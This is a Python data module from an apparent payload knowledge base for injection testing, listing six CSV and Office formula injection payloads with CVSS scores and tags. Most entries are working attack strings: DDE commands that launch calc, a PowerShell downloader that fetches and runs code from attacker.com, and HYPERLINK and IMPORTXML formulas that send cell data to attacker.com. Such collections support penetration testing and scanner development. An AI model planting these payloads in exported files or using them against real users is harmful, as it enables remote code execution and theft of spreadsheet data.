#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2026-01-10 UTC
Status: Created
Telegram: https://t.me/EasyProTech

Office and CSV Injection Payloads
"""

from ..models import PayloadEntry

OFFICE_INJECTION_PAYLOADS = {
    "csv_basic_calc": PayloadEntry(
        payload='=cmd|\'/C calc\'!A0',
        contexts=["csv_injection", "office"],
        severity="high",
        cvss_score=7.8,
        description="Classic DDE CSV Injection to pop calc",
        tags=["csv", "dde", "rce", "excel"],
        reliability="high",
        attack_surface="file-export"
    ),
    "csv_powershell_exfil": PayloadEntry(
        payload='=cmd|\'/C powershell IEX(wget attacker.com/s)\'!A0',
        contexts=["csv_injection", "office"],
        severity="critical",
        cvss_score=9.3,
        description="CSV Injection to execute PowerShell downloader",
        tags=["csv", "dde", "powershell", "rce"],
        reliability="medium",
        attack_surface="file-export"
    ),
    "csv_hyperlink_exfil": PayloadEntry(
        payload='=HYPERLINK("http://attacker.com/leak?data="&A1, "Click me")',
        contexts=["csv_injection", "office", "google_sheets"],
        severity="medium",
        cvss_score=5.5,
        description="Data exfiltration via HYPERLINK formula",
        tags=["csv", "formula", "exfiltration", "phishing"],
        reliability="high",
        attack_surface="file-export"
    ),
    "csv_google_sheets_import": PayloadEntry(
        payload='=IMPORTXML("http://attacker.com/steal","//a")',
        contexts=["csv_injection", "google_sheets"],
        severity="medium",
        cvss_score=6.5,
        description="Google Sheets IMPORTXML data exfiltration",
        tags=["csv", "google-sheets", "importxml"],
        reliability="high",
        attack_surface="cloud-office"
    ),
    "csv_dynamic_data_exchange": PayloadEntry(
        payload='+dynamic|stuff!A1',
        contexts=["csv_injection", "office"],
        severity="high",
        cvss_score=7.8,
        description="Alternative DDE injection using + prefix",
        tags=["csv", "dde", "plus-prefix"],
        reliability="medium",
        attack_surface="file-export"
    ),
    "csv_at_symbol_start": PayloadEntry(
        payload='@SUM(1+1)*cmd|\'/C calc\'!A0',
        contexts=["csv_injection", "office"],
        severity="high",
        cvss_score=7.5,
        description="CSV Injection starting with @ symbol",
        tags=["csv", "dde", "at-prefix"],
        reliability="medium",
        attack_surface="file-export"
    )
}

OFFICE_TOTAL = len(OFFICE_INJECTION_PAYLOADS)
